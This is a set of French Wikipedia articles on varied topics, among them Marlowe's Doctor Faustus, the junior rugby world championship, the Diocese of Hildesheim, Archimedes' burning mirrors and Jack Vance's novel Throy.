Étalonnier.
L’étalonnier s'occupe des étalons, comme son nom l'indique. Il vend et assure les saillies des étalons. Parfois, il gère administrativement et commercialement leur carrière de reproducteur et pratique l'insémination artificielle. C'est généralement un métier saisonnier exercé par un professionnel du cheval, lui-même éleveur ou responsable de haras.

</doc>
<doc id="3214285" url="https://fr.wikipedia.org/wiki?curid=3214285" title="Mission de San Antonio de Valero">
Mission de San Antonio de Valero



</doc>
<doc id="3214287" url="https://fr.wikipedia.org/wiki?curid=3214287" title="La Tragique Histoire du docteur Faust">
La Tragique Histoire du docteur Faust

La Tragique Histoire du docteur Faust (en ) est une pièce de théâtre de Christopher Marlowe écrite en 1592, donnée pour la première fois entre 1594 et 1597 et publiée seulement en 1604 après la mort de son auteur. Elle est basée sur le mythe du docteur Faust.
Cette tragédie s’inscrit dans la période de la Renaissance élisabéthaine, qui, en Angleterre, se développa sous le règne d’Élisabeth (1558-1603), surtout caractérisée par la popularité de sujets historiques, plus particulièrement par un intérêt humaniste pour les sujets de l’Antiquité romaine et grecque. À cette époque, les premières troupes professionnelles d’acteurs voient le jour, et la reine parraine plusieurs artistes et dramaturges. Christopher Marlowe, exact contemporain de William Shakespeare, est l'un des auteurs les plus connus de cette époque.
Résumé.
"La Tragique Histoire du docteur Faust" évoque un certain Faust, qui vécut entre la fin du et le début du , et s'inspire très largement de la légende selon laquelle ce personnage aurait donné son âme au Diable en échange de pouvoirs. Le mythe devint très populaire après la publication anonyme de "Historia von D. Johann Fausten" par Johann Spies (Francfort, 1588).
L'histoire commence par une lamentation de Faust, qui a réussi à comprendre et intégrer tout ce qu'il est possible d'apprendre, dans toutes les sciences connues. Assoiffé de savoir, il se tourne donc vers les sciences occultes, ou magie noire. Alors qu'il blasphème le nom de Dieu, une figure diabolique apparaît, se présentant sous le nom de Méphistophélès. Celui-ci explique que Lucifer l'envoie trouver tous les blasphémateurs, car ce sont de potentielles âmes qui pourraient s'offrir à lui. Faust conclut donc un marché avec l'envoyé de l'Enfer : en échange de son âme et de son corps, Méphistophélès sera à son service durant les vingt-quatre années à venir. Passé ce délai, Lucifer viendra chercher l'âme de Faust pour l'emmener dans son royaume. Pleinement conscient de ce qui l'attend, Faust scelle le pacte et obtient les services de Méphistophélès.
Pour autant, Faust ne s'en sert que pour des actes très futiles, absolument pas pour les plans grandioses et ingénieux qu'il avait prévus au départ. L'explication à cela est que son âme, désormais liée à Lucifer, n'est plus capable d'élaborer des projets aussi magnifiques que ce qu'il voulait avant qu'il ne la vendît : c'est la dégradation de l'homme et la désintégration de l'âme.
Lorsque les vingt-quatre années s'achèvent, Faust n'a donc rien accompli et se retrouve face à l'inéluctable destin de souffrances et de torture qui l'attend. Durant la dernière heure qu'il lui reste, il va chercher par tous les moyens à échapper à son supplice — en vain : Lucifer vient chercher ce qui lui a été promis, achevant ainsi la vie du célèbre Docteur Faust.
Reprise dans l'art.
Cette pièce de théâtre a inspiré l'opéra de Pascal Dusapin, "Faustus, the Last Night" composé en 2004.
Jerzy Grotowski se servit en 1963 de la pièce de Marlowe pour un spectacle de son Théâtre Laboratoire.

</doc>
<doc id="3214295" url="https://fr.wikipedia.org/wiki?curid=3214295" title="Liste des districts du Trentin-Haut-Adige">
Liste des districts du Trentin-Haut-Adige

Dans la région autonome de Trentin-Haut-Adige en Italie, les comunità comprensoriali (en allemand : Bezirksgemeinschaften) ou comunità di valle (en allemand : Talgemeinschaften) sont des collectivités territoriales constituées des communes de la province autonome de Trente (Trentin) et de la province autonome de Bolzano (Tyrol du Sud). Le rôle de ces zones administratives est la coordination des communes pour tout ce qui touche la culture, l'économie et l'écologie.
Les 15 unités administratives (comunità di valle) du Trentin.
Le Trentin est divisé en communautés ("comunità di valle"). Depuis 2006, la province en compte 15, contre 11 auparavant.
Les 8 unités administratives (comunità comprensoriale) du Haut-Adige.
Semblable au Trentin, le Haut-Adige (Tyrol du Sud) est divisé en 8 communautés ("comunità comprensoriale").

</doc>
<doc id="3214304" url="https://fr.wikipedia.org/wiki?curid=3214304" title="Championnat du monde junior de rugby à XV">
Championnat du monde junior de rugby à XV

Le championnat du monde junior de rugby à XV est une compétition internationale de rugby à XV qui oppose chaque année les meilleures équipes nationales en catégories juniors.
Dans sa formule actuelle, World Rugby organise depuis 2008 la compétition entre équipes de moins de 20 ans. Elle remplace alors les précédentes formules dédiées aux catégories des moins de 19 ans et moins de 21 ans.
Le titre est détenu par l'équipe d'Angleterre de rugby à XV des moins de 20 ans après l'édition 2024. Les Néo-Zélandais sont les plus titrés avec six victoires dans la compétition.
Histoire.
Le championnat du monde des moins de 20 ans est créé en 2008, remplaçant les championnats du monde des moins de 21 ans et des moins de 19 ans à la suite de la décision de l'IRB en 2007 de restructurer les compétitions internationales juniors ; une deuxième division est également mise en place, le Trophée mondial.
La première édition de ce « nouveau » championnat du monde a lieu au pays de Galles, seize équipes y participent. Les Néo-Zélandais, dont la plupart des joueurs ont été vainqueurs l'année précédente du championnat du monde des moins de 19 ans, la remportent en battant tous leurs adversaires d'au moins 25 points et en n'encaissant qu'un seul essai en cinq matchs. Ils dominent notamment les Anglais en finale sur le score de 38 à 3.
L'année suivante, les seize équipes se retrouvent au Japon. L'équipe de Nouvelle-Zélande est renouvelée en quasi-totalité et n'est pas forcément favorite de la compétition : l'équipe d'Australie, avec plusieurs joueurs ayant déjà joué en Super 14, est également attendue. Les deux équipes se rencontrent en demi-finale, les " s'imposent 31-17 et gagnent la compétition quatre jours plus tard face, une nouvelle fois, à l'Angleterre. Les Néo-Zélandais remportent également les deux éditions suivantes : ils battent largement 62 à 17 les Australiens lors de l'édition 2010 disputée en Argentine et dominent une nouvelle fois les Anglais (33-22) en 2011 pour leur troisième confrontation en finale.
En 2012, la compétition a lieu en Afrique du Sud et les " connaissent leur première défaite depuis la création de la compétition lorsqu'ils sont battus en poule par les Gallois sur le score de 9 à 6. Les Sud-Africains remportent alors la compétition à domicile en dominant les Néo-Zélandais en finale sur le score de 22 à 16. Ils mettent ainsi fin à la suprématie néo-zélandaise dans la compétition. En 2013, la compétition a lieu pour la première fois en France. Le championnat est remporté par l'équipe d'Angleterre qui domine les Gallois sur le score de 20 à 15 dans la première finale 100 % européenne. L'Afrique du Sud termine troisième tandis que les hôtes de la compétition finissent cinquièmes après avoir battu l'Argentine sur le score de 37 à 34.
L'équipe de France a remporté trois éditions de la compétition de suite, en 2018 en France, en 2019 en Argentine, et en 2023 en Afrique du Sud, et a perdu la finale de l'édition 2024 contre l'Angleterre.
En 2020, la compétition qui devait se tenir en Italie est annulée à cause de la pandémie de Covid-19 ; les éditions 2021 et 2022 connaissent le même sort, en l'absence d'amélioration sanitaire et de garanties financières.
Un format étendu est annoncé en vue de l'édition 2026, avec seize équipes prenant part à la compétition.
Compétitions précédentes.
Championnat du monde des moins de 19 ans.
Histoire.
Créé en 1969, le championnat du monde junior (JWRC), est organisé par la Fédération internationale de rugby amateur (FIRA), jusqu'en 1991.
L'année suivante, l'International Rugby Board (IRB) s'associe à la FIRA pour organiser les éditions jusqu'en 2003. Sous un nouveau format, la compétition est divisée en plusieurs divisions hiérarchiques, la première – ou poule A – sacre le champion du monde, tandis qu'un système de promotion-relégation intervient d'année en année.
Par la suite, à partir de 2004, l'IRB s'occupe seul de la compétition. La structure en divisions hiérarchiques est conservée, avec des poules de 12 équipes.
Après l'édition 2007, la restructuration par l'IRB des compétitions internationales juniors actée la même année marque la fin du championnat du monde des moins de 21 ans, au profit de la catégorie des moins de 20 ans.
Championnat du monde des moins de 21 ans.
Histoire.
Le championnat du monde des moins de 21 ans trouve ses origines auprès d'une compétition organisée par la SANZAR et l'UAR, le tournoi SANZAR/UAR des moins de 21 ans (), entre les équipes d'Argentine, d'Afrique du Sud, d'Australie et de Nouvelle-Zélande ; la première édition a lieu en 1995, après la Coupe du monde des équipes senior.
Lors de la de 1998, des équipes extérieures à la SANZAR et l'UAR sont invitées, l'Angleterre et la France ; la France déclinera finalement sa participation peu avant l'ouverture du tournoi.
En 1999, l'Écosse et le pays de Galles sont également invités en plus de l'Angleterre et de la France.
En 2000, les équipes invitées sont l'Angleterre, l'Écosse, les Samoa et les Tonga.
L'édition 2001 voit, parmi les équipes invitées, l'Irlande.
Dans l'optique de développer la compétition en vue de l'édition 2002, le format est étendu à 12 équipes, et le tournoi laisse place à un championnat du monde organisé par l'IRB plutôt qu'à un tournoi régional sur invitation.
En 2006, l'épreuve s'est déroulée en France, en Auvergne, à Clermont-Ferrand, Thiers, Riom, Vichy et Issoire.
Après cette édition 2006, la compétition doit par la suite être disputée sous un format biannuel ; néanmoins, la restructuration par l'IRB des compétitions internationales juniors actée en 2007 marque la fin du championnat du monde des moins de 21 ans, au profit de la catégorie des moins de 20 ans.

</doc>
<doc id="3214307" url="https://fr.wikipedia.org/wiki?curid=3214307" title="François Wicart">
François Wicart

François Wicart est un footballeur français, né le à Bruay-en-Artois et mort le à Feurs. Ce défenseur-latéral n'a connu que deux clubs professionnels : le FC Rouen et l'AS Saint-Étienne.
Il a prolongé sa carrière chez "les verts" comme technicien, assurant à deux reprises l'intérim du poste d'entraîneur de l'équipe professionnelle, remplaçant successivement René Vernier et Henri Guérin. En 1960, il rentre dans le staff technique aux côtés de René Vernier avec le titre d'entraîneur suppléant. Il lui est demandé de préparer l'avenir de l'ASSE en s'occupant plus spécifiquement des espoirs du club. 
Mais le , l'entraîneur René Vernier est remercié pour absence de résultat. L'ASSE occupe une peu reluisante place alors qu'en début de saison, certains techniciens comme Albert Batteux, qui officiait alors à Reims, n'hésitait pas à désigner Saint-Étienne comme l'un des outsiders pour la victoire finale. Le président de la commission sportive, Roger Rocher, qui prend de plus en plus d'importance au sein du comité directeur, confie la direction de l'équipe à François Wicart. Il entreprend un redressement spectaculaire et permet aux Verts d'atteindre les quarts de finale de la Coupe de France ainsi qu'une honorable place au classement du championnat 1960-61. 
La saison suivante, il cède sa place à Henri Guérin. Le , à la suite d'une défaite humiliante à Lyon (0-4), il est à son tour limogé et François Wicart reprend du service avec comme impératif de sauver le club de la relégation. Il n'atteint pas cet objectif mais il permet à l'ASSE de remporter sa première Coupe de France au détriment de Nancy battu 1-0 à Colombes le . 
Lors de la saison 1962-63, il est reconduit au poste d'entraîneur et il parvient, sans trop de difficultés, à faire remonter Saint-Étienne parmi l'élite. Il peut alors s'effacer au profit du mythique Jean Snella qui prend la succession à partir de la saison 1963-64 avec le succès que l'on sait.

</doc>
<doc id="3214309" url="https://fr.wikipedia.org/wiki?curid=3214309" title="Peter Custis">
Peter Custis

Peter Custis (1781- à New Bern) est un naturaliste américain, né à Deep Creek en Virginie. Il fait ses études à l'Université de Pennsylvanie à Philadelphie. Il est choisi par le président américain Thomas Jefferson pour explorer la Rivière Rouge avec Thomas Freeman (1806).
Études.
Il est le fils d'un propriétaire terrien de la côte orientale de la péninsule de Virginie. Il commence ses études de médecine et d'histoire naturelle à l'University of Pennsylvania, en 1804, où il est l'élève de Benjamin Smith Barton. Il y obtient son doctorat, en 1807, présentant sa thèse intitulée "Bilious Fever of Albemarle County [Virginia]". Puis il ouvre ensuite un cabinet médical, tout d'abord à Onancock, puis à New Bern, où il exercera jusqu'à sa mort.
Carrière.
En 1806, âgé seulement de 25 ans, il est engagé par le gouvernement de Jefferson, en tant que naturaliste, pour accompagner Thomas Freeman dans une ambitieuse expédition sur la Rivière Rouge. L'expédition part de Natchez, le et a pour but d'atteindre la source de la rivière, que l'on suppose être située près de Santa Fe. L'expédition devra cependant renoncer à atteindre son but, alors qu'elle a déjà parcouru plus de depuis le confluent de la rivière avec le Mississippi, sa route étant barrée par des troupes espagnoles (Le Texas appartient alors toujours à l'Espagne). Pendant le périple, Custis recueille des données météorologiques, géographiques et ethniques concernant la vallée de la rivière. Ses plus importantes notes et collection d'échantillons concernent l'histoire naturelle de la région. Il répertorie 22 mammifères, 36 oiseaux, 17 poissons, reptiles et amphibiens, trois insectes, 43 arbres et plus de 100 végétaux. Des études ultérieures révèlent que quarante-quatre d'entre elles sont de nouvelles espèces. Il fait également l'une des premières observations écologiques, en identifiant une quinzaine de plantes européennes et tropicales qui ont commencé à coloniser la région. Retournant ensuite à ses études de médecine, il abandonne l'histoire naturelle vers 1808.

</doc>
<doc id="3214311" url="https://fr.wikipedia.org/wiki?curid=3214311" title="Mawson">
Mawson



</doc>
<doc id="3214314" url="https://fr.wikipedia.org/wiki?curid=3214314" title="Popovac (Osijek-Baranja)">
Popovac (Osijek-Baranja)

Popovac est un village et une municipalité située dans le comitat d'Osijek-Baranja, en Croatie. Au recensement de 2001, la municipalité comptait , dont 69,02 % de Croates et 20,85 % de Serbes ; le village seul comptait .
Histoire.
Un monument viticole.
Le site a livré au le vestige d’un autel dédié à "Liber Pater" (équivalent de Bacchus) et portant une inscription relative à la culture de la vigne. Ce témoignage remonte sans doute à l’époque de Probus (276 – 282) empereur romain connu pour avoir autorisé et favorisé la culture de la vigne en Gaule et en Pannonie.
Ce bloc est aujourd’hui conservé au musée archéologique de Zagreb. L’inscription en 12 lignes témoigne de la culture de la vigne à l'époque romaine, avec une énumération exceptionnelle de plants fondée sur des toponymes. Seuls ceux du Valais semblent bien identifiés. Le texte peut se traduire de la manière suivante :
Localités.
La municipalité de Popovac compte 3 localités :

</doc>
<doc id="3214316" url="https://fr.wikipedia.org/wiki?curid=3214316" title="Meurtre à Yoshiwara">
Meurtre à Yoshiwara

 est un film japonais réalisé par Tomu Uchida, sorti en 1960.
Synopsis.
Jirozaemon est un riche et honnête fabricant de soie qui avait été abandonné à la naissance par une famille inconnue mais sans doute aisée. Il est affecté d'une cicatrice au visage dont l'extrême laideur fait fuir les femmes. Comme il souhaite une épouse coûte que coûte, des clients lui arrangent des rencontres : en vain. Ils décident un jour de distraire le malheureux en l'emmenant à Yoshiwara, le quartier des plaisirs de Edo (ancien nom de Tokyo). Là-bas, même les geishas ne veulent pas lui tenir compagnie. Seule Tamatsuru, une prostituée de bas-étage sortant de prison et décidée à monter dans la hiérarchie sociale, accepte la compagnie du « monstre ». Celui-ci s'en émeut. Elle lui promet le mariage s'il l'aide à devenir « première courtisane ». Jirozaemon se ruine pour elle, à un moment où son entreprise traverse une mauvaise passe, avant de réaliser que le tout Yoshiwara s'est moqué de lui...

</doc>
<doc id="3214318" url="https://fr.wikipedia.org/wiki?curid=3214318" title="Diocèse de Hildesheim">
Diocèse de Hildesheim

Le diocèse de Hildesheim (en latin : "Dioecesis Hildesiensis") est un diocèse catholique d’Allemagne du Nord dont le siège est à Hildesheim.
Géographie.
Le diocèse s'étend sur la partie orientale de la Basse-Saxe située à l'est de la Weser et au nord de l'arrondissement de Brême (Brême-Nord, c'est-à-dire la partie de la ville de Brême située au nord de Lesum, et Bremerhaven). C'est le diocèse le plus étendu de toute l'Allemagne : il comprend entièrement plusieurs régions d'Allemagne, où d'ailleurs les catholiques sont minoritaires, et vivent au milieu d'une diaspora. En vérité, les catholiques ne sont majoritaires que dans la paroisse d’Untereichsfeld au sud du diocèse, ainsi que dans les villages des « petites paroisses » traditionnelles autour de Hildesheim.
Le siège épiscopal est à Hildesheim, où se trouve la cathédrale Sainte-Marie-de-l'Assomption. Le territoire diocésain compte trois basiliques mineures : à Duderstadt, Saint-Gothard à Hildesheim et à Hanovre.
Histoire.
Vers l'an 800, Charlemagne envoie une mission pour évangéliser l'Ostphalie à Elze (appelée alors "Aula Cæsaris", abrégée en "Aulica"), environ à l'ouest de l'actuelle Hildesheim. Il mit cette mission sous la protection des apôtres Pierre et Paul, dont on retrouve encore aujourd'hui les noms sur la vieille église d’Elze. Puis Louis le Pieux transféra le siège de la mission en 815 à Hildesheim et l'éleva en évêché dédié à la Vierge Marie.
Bien que la ville ait été gagnée à la Réforme en 1542, grâce à la prédication de Johannes Bugenhagen et d'Anton Corvinus, deux disciples de Martin Luther, et que tout le conseil de la ville ait signé en 1580 la Formule de Concorde luthérienne, l'évêché de Hildesheim subsista à la fois comme diocèse catholique et comme principauté du Saint-Empire, la cathédrale ainsi que l'abbaye (et en partie l'église Saint-Michel) conservant elles aussi leur statut confessionnel. Comme les autres principautés ecclésiastiques, l'évêché de Hildesheim fut sécularisé en 1803, puis rétabli en 1824 en tant que diocèse de Hildesheim.
Le 26 mars 1824, les frontières diocésaines subirent des changements radicaux, pour la première fois depuis 815. Avec la bulle "Impensa romanorum pontificum" du pape Léon XII, les circonscriptions ecclésiastiques du royaume de Hanovre, qui comprenaient les sièges de Hildesheim et d'Osnabrück, furent réorganisées, leurs frontières coïncidant désormais avec celles de l'État : le nouveau diocèse de Hildesheim, immédiatement soumis au Saint-Siège (exempt), s'étendait dans la partie orientale du royaume, séparé de celui d'Osnabrück par le fleuve Weser, et vit son territoire considérablement agrandi, s'étendant désormais jusqu'à la mer du Nord et au fleuve Elbe. Par décret de la Congrégation consistoriale du 2 juillet 1834, la compétence sur les catholiques du duché de Brunswick fut également attribuée au diocèse de Hildesheim.
L'évêque Eduard Jakob Wedekin (1850-1870) donna une grande impulsion à la renaissance du diocèse de Hildesheim : il ouvrit de nouveaux postes de mission dans la partie nord du diocèse ; il encouragea la pratique des exercices spirituels pour ses prêtres, la fondation d'associations catholiques et la prédication de missions paroissiales ; il appela dans son diocèse plusieurs congrégations religieuses, dont les Lazaristes, auxquels il confia la direction du séminaire.
Le développement économique qui toucha les villes de Hanovre, Hambourg et Brême favorisa l'émigration interne et, par conséquent, l'augmentation du nombre de catholiques présents dans le diocèse. En 1890, on comptait environ catholiques, un chiffre qui doubla vingt ans plus tard. Le nombre de paroisses passa de 91 en 1890 à 138 en 1915.
Le 13 août 1930, avec la bulle "Pastoralis officii nostri" du pape Pie XI, le diocèse fut intégré à la province ecclésiastique de Paderborn.
À la fin de la Seconde Guerre mondiale, la population catholique du diocèse tripla en raison de l'arrivée de nombreux réfugiés fuyant les régions orientales de l'Allemagne, notamment de la Silésie et de la région des Sudètes.
En vertu de la convention conclue entre le Saint-Siège et la Basse-Saxe le 26 février 1965, qui reprend les articles du concordat avec la Prusse de 1929, le droit d'élire les évêques de Hildesheim fut accordé au chapitre des chanoines de la cathédrale, sur une liste de trois noms proposés par le Saint-Siège.
Le 14 septembre 1966, conformément aux décisions de la convention de l'année précédente, les frontières entre les diocèses de Hildesheim et d'Osnabrück ont été revues.
Le 7 avril 1994, il a agrandi son territoire avec certaines paroisses qui appartenaient déjà à l'administration apostolique de Schwerin. Le 24 octobre suivant, il a cédé une partie de son territoire au profit de la création de l'archidiocèse de Hambourg, dont Hildesheim est devenu suffragant.
Le diocèse de Hildesheim gère la bibliothèque et le musée de la cathédrale de Hildesheim.
Statistiques.
En 2023, le diocèse comptait catholiques (en baisse constante) pour habitants (11,2%), servis par 282 prêtres (243 séculiers et 39 réguliers), 101 diacres permanents, 47 religieux et 93 religieuses dans 119 paroisses regroupées en 18 doyennés.

</doc>
<doc id="3214320" url="https://fr.wikipedia.org/wiki?curid=3214320" title="Miroir ardent">
Miroir ardent

Les miroirs ardents permettent d'enflammer à distance des matériaux.
Dispositif didactique.
On appelle aujourd'hui miroirs ardents un dispositif expérimental utilisé notamment dans les cabinets scientifiques des . Il s'agit de deux miroirs métalliques concaves (paraboliques) aux foyers desquels on peut placer des corbeilles, l'une contenant des charbons ardents, l'autre (le plus souvent) de l'amadou.
Lorsque les deux miroirs sont en face l’un de l’autre, la lumière rayonnée depuis les charbons ardents arrive sur l’amadou qui prend feu.
Ces appareils illustrent donc la propagation de la chaleur sous forme de rayonnement lumineux (rayonnement thermique) dans l'infrarouge essentiellement.
Historique.
Archimède et le siège de Syracuse.
Archimède est réputé pour être fin stratège et l'inventeur de nombre de machines de guerre, notamment lors de la deuxième guerre punique pour le célèbre siège de Syracuse (), alliée aux Carthaginois, afin de résister aux troupes romaines conduites par le général Marcellus. La légende veut qu'il ait mis au point des miroirs géants pour réfléchir et concentrer les rayons du soleil dans les voiles des navires romains et ainsi les enflammer. Les historiens antiques qui décrivent le plus précisément le siège de Syracuse n'évoquent jamais cette anecdote. Polybe (vers 203-) reste silencieux quant à cette affaire de miroir ardent, tout comme Tite-Live ( - ) et Plutarque (45-). Il faut attendre des auteurs tardifs pour mettre au jour les premières évocations de ce système de défense. En effet, la première mention date du et se trouve dans un ouvrage de l'ingénieur et architecte byzantin Anthémius de Tralles (vers 474-vers ), consacré aux "Machines extraordinaires". 
Démonstration du Comte de Buffon au roi.
En 1747, fasciné par le rapport entre la lumière et la chaleur, le Comte de Buffon prouve au château de la Muette, en présence du roi , lors d’une véritable exhibition, la réalité des miroirs ardents d’Archimède devant un public composé de gens de qualité ; mais il observe qu'un miroir parabolique, outre les difficultés de réalisation, est moins efficace qu'une batterie de miroirs plans échelonnés selon un arc de parabole. Dans son rapport de l'expérience à l'Académie des sciences, Buffon signale la difficulté à faire fabriquer des lentilles suffisamment épaisses par les fabricants ; il reproche à Descartes d'avoir affirmé que la taille du miroir est indifférente à l'intensité réfléchie, et d'avoir négligé ce qu'on appelle aujourd'hui les pertes par conduction thermique ; enfin, à 
Du Fay, d'avoir estimé que les récits des miroirs ardents d'Archimède n'étaient qu'une fiction.
Controverses.
De nombreux scientifiques doutent néanmoins aujourd'hui de la vraisemblance des faits proposés concernant les miroirs géants lors du siège de Syracuse. Descartes a été le premier détracteur de la prouesse attribuée à Archimède et, depuis, le scepticisme est toujours de rigueur dans la communauté scientifique.
En 1977, le physicien anglais D.L. Simms, spécialiste de la combustion, se penche à nouveau sur la question : d'après lui, si les preuves historiques restent très légères, il est techniquement et scientifiquement impossible qu'Archimède ait été en mesure de réaliser l'exploit de brûler à distance les navires ennemis à l'aide de miroirs ardents.
Difficile de croire, en effet, qu'à cette époque le savant ait pu disposer des connaissances et des moyens techniques suffisants pour mener à bien le prodige. Toutefois, en 1973, l'ingénieur grec Ioannis Sakkas avait montré que de bons résultats auraient pu être obtenus avec des miroirs métalliques. Il a pour cela utilisé des panneaux métalliques aux dimensions proches de celles du bouclier grec standard (), en les patinant d'une mince couche de bronze dépoli (pour pousser la précision du détail historique). Il a testé son matériel au Pirée, sur un modèle réduit de galère ( de longueur) à une cinquantaine de mètres : l'embarcation s'est vivement enflammée en deux minutes. Simms lui-même doit concéder qu'à Syracuse, par beau temps, l'effet aurait pu être encore plus rapide. Toutefois, il faut imaginer que le navire soit exactement situé au point de focalisation des rayons, ce qui semble délicat dans la réalité d'une bataille.
Une expérience menée par des étudiants du (MIT) en semblait démontrer que cette hypothèse était réaliste. Le professeur David Wallace et ses étudiants parvinrent en effet à enflammer une reconstitution de bateau romain à de distance en dix minutes. Cependant, cette expérience avait été menée hors de l’eau, sur du bois sec, sur une cible immobile et à l’aide de miroirs ordinaires et non de miroirs en bronze comme ceux de l’époque d’Archimède.
L’expérience fut renouvelée lors de l’émission de télévision MythBusters sur Discovery Channel en janvier 2006 ; le professeur Wallace et l’équipe d’étudiants du MIT furent invités à prendre part à cette nouvelle tentative. Cependant, cette reconstitution fut recréée dans des conditions beaucoup plus réalistes et donna des résultats très différents. Tout d’abord, l’équipe de Mythbusters choisit pour cible un véritable bateau dont la coque était par conséquent gorgée d’humidité. Celui-ci restera totalement immobile pendant toute l’expérience. Ensuite, les participants utilisèrent des miroirs de bronze poli, les seuls disponibles à l’époque d’Archimède. Après plusieurs essais à l’aide de différents miroirs, les participants furent incapables de bouter le feu au navire à 30 mètres de distance, réussissant simplement à faire fumer la coque sans qu’elle prenne feu et à condition que le bateau reste strictement immobile. Une tentative menée sur les voiles du navire n’aboutit tout simplement à aucun résultat, les voiles blanches renvoyant la chaleur des rayons lumineux et sortant constamment du foyer en raison du vent. Enfin, une nouvelle tentative à 20 mètres à l’aide de miroirs ordinaires et sur un navire toujours immobile parvint à enflammer péniblement la coque après quelques minutes.
Les nombreuses difficultés rencontrées lors de l’expérience montrent, selon toute vraisemblance, que l'épisode des miroirs d’Archimède n'est qu'une légende. Plusieurs facteurs tendent à prouver cela :
Applications.
Four solaire.
Concentrer la lumière en un point grâce à un miroir pour augmenter la température est également le principe des fours solaires dont le plus puissant est celui d'Odeillo, mis en service en 1970, où une température de peut être atteinte.
Centrale solaire à concentration.
Une autre application du principe des miroirs ardents s'est trouvée dans la production d'énergie dans les centrale solaire thermodynamiques. Ainsi, la Centrale solaire d'Ivanpah concentre l'énergie de plus de cent mille miroirs pour générer de l'énergie électrique.

</doc>
<doc id="3214322" url="https://fr.wikipedia.org/wiki?curid=3214322" title="Championnat du monde junior de rugby à XV 2008">
Championnat du monde junior de rugby à XV 2008

Le Championnat du monde junior de rugby à XV 2008 se déroule au pays de Galles du au et voit la victoire de la Nouvelle-Zélande.
Pour la première fois, ce sont seize équipes qui participent au Championnat du monde junior, en lieu et place des Championnats du monde des moins de 19 ans et des moins de 21 ans. Les Néo-Zélandais, dont la plupart des joueurs ont été vainqueurs l'année précédente du Championnat du monde des moins de 19 ans, la remportent en battant tous leurs adversaires d'au moins et en n'encaissant qu'un seul essai en cinq matchs. Ils dominent notamment les Anglais en finale sur le score de 38 à 3.
Les États-Unis terminent derniers de la compétition et sont relégués en Trophée mondial à partir de l'.
Équipes participantes et poules.
Les équipes participantes, réparties dans quatre poules, sont les suivantes :
Stades.
La compétition est organisée au pays de Galles. Les stades retenus sont les suivants :
Résultats.
Phase finale.
Classement 1 à 4.
Finale.
L'équipe de Nouvelle-Zélande s'impose 38 à 3 contre l'Angleterre et remporte la première édition du Championnat du monde junior.
Classement final de 1 à 8.
Le classement final de la compétition est le suivant :
Les États-Unis sont derniers de la compétition et sont relégués en Trophée mondial à partir de l'.
Récompenses et statistiques.
Meilleur joueur des moins de 20 ans de l'année.
Le troisième ligne aile néo-zélandais, Luke Braid, est élu meilleur jeune joueur de l'année après ses bonnes performances durant la compétition et son titre de champion du monde junior.
Meilleurs réalisateurs.
Le demi d'ouverture ou centre sud-africain, , est le meilleur réalisateur de la compétition avec , décomposés de trois essais marqués, , cinq pénalités et un drop inscrits.
Meilleurs marqueurs.
L'ailier australien, Nemani Nadolo, termine meilleur marqueur avec sept essais inscrits.
Statistiques des équipes.
Au total, sont inscrits durant la compétition, dont .
L'Afrique du Sud possède la meilleure attaque avec et marqués.
Les champions du monde néo-zélandais gagnent leurs matchs par au moins d'écart durant le tournoi. Ils possèdent la deuxième meilleure attaque avec et inscrits. De plus, ils ont également la meilleure défense avec seulement concédés, dont un seul essai, en cinq matchs.

</doc>
<doc id="3214325" url="https://fr.wikipedia.org/wiki?curid=3214325" title="Throy">
Throy

Throy (titre original : "Throy") est un roman de science-fiction écrit par l'auteur américain Jack Vance et paru en France en 1992. Ce roman est le quatrième et dernier volume du cycle "Les Chroniques de Cadwal" et fait suite au troisième volume, "Bonne Vieille Terre".
Argument.
Alors que Wayness Tamm et Glawen Clattuc viennent tout juste de sauver la Charte, et par là même les conditions de vie sur Cadwal, le Conservateur réunit une bonne partie de la population de la planète sur le continent Throy pour faire une annonce qui va modifier profondément leur avenir. Seulement, les adversaires à ce projet sont légion, et désormais pour eux il n'y a plus le choix, il leur faut passer aux choses sérieuses...
Résumé.
Le Conservateur l'a annoncé : la ville de Stroma sur le Throy va être totalement évacuée, et rasée. Ses habitants seront relogés près de la station Araminta. Désormais la nouvelle Charte est beaucoup plus explicite et ne tolérera plus aucune entorse aux règlements. Les Yips devront être évacués au plus vite de l'atoll de Lutwen, quoi qu'en pense Smonny. Le parti du VPL (Vie Paix et Liberté) qui prétendait vouloir le bien commun voit ses objectifs pratiquement réduits à néant car sans objet. Plusieurs de ses représentants perdent leur poste et les autres sont réduits au silence.
Mais les VPL et les Yips de Smonny sont bien décidés à riposter et à s'unir contre les Chartistes. Corruption, chantage, assassinat et achat de vaisseaux de combats font désormais partie de leurs méthodes pour imposer leur volonté. Smonny ne pense qu'à sa vengeance sur la station Araminta, et rêve de la voir engloutie sous une marée de Yips déchaînés. Les VPL sont plus que jamais décidés à se tailler des domaines sur Cadwal, avec les Yips pour serviteurs.
Glawen s'apprêtait à se marier avec Wayness, mais les complots fleurissent sur le Throy. Sur ordre du Bureau B, celui qui vient de devenir le plus jeune Commandant de la police de Cadwal part en mission avec son ami Chilke, lui aussi promu à un rang presque égal. Leur but : retrouver un milliardaire insaisissable qui dirige des chantiers de construction capable de fournir des vaisseaux de combat aux Yips, aux VPL ou à la station Araminta selon celui qui parviendra à le convaincre. Namour fait aussi partie de leurs objectifs, car il a été depuis le début l'un des criminels qui ont déclenché tous ces problèmes et fait couler tant de sang.
Cette quête va les conduire sur des planètes exotiques, remplies de mystère. Sur la piste, ils apprendront qui est réellement le milliardaire tant recherché ainsi que sa jeune et séduisante compagne affublée du nom de Flitz dont personne ne sait rien.
Pendant ce temps sur Cadwal, les VPL et les Yips se déchirent de plus en plus, car si tous sont opposés à la Charte, Smonny veut une invasion totale des Yips alors que les VPL menés par l'incontournable Julian Bohost ne veulent qu'une migration limitée, suffisante pour leur futurs domaines. Chaque parti a des armes en réserve et ne tarde pas à s'en servir. Avant la fin, Cadwal est le théâtre d'une apothéose sanglante. Les meneurs du VPL sont exécutés pour leurs crimes, et les Yips envoyés hors monde pour se rebâtir un avenir.
L'histoire pourrait s'arrêter là, mais Jack Vance nous dévoile enfin la solution d'une des énigmes du premier roman du cycle, l'assassinat de la mère de Glawen par des Yips, sur ordre de Namour et par la volonté de vengeance de Spanchetta. Ces deux derniers, ainsi que Smonny sont arrêtés, et comme leur mort serait trop douce aux yeux de Scharde Clattuc le père de Glawen, ils sont expédiés sur l'Ecce sauvage pour y passer le restant de leur existence, dans la prison qui servait auparavant à Smonny.
Enfin, Wayness et Glawen peuvent se marier. Chilke le solitaire a trouvé l'amour en la personne de Flitz. Bodwyn Wook démissionne de son poste de directeur du Bureau B pour aller jouer les touristes sur Terre. Un nouveau cycle de vie commence sur Cadwal, beaucoup plus calme et idyllique. 

</doc>
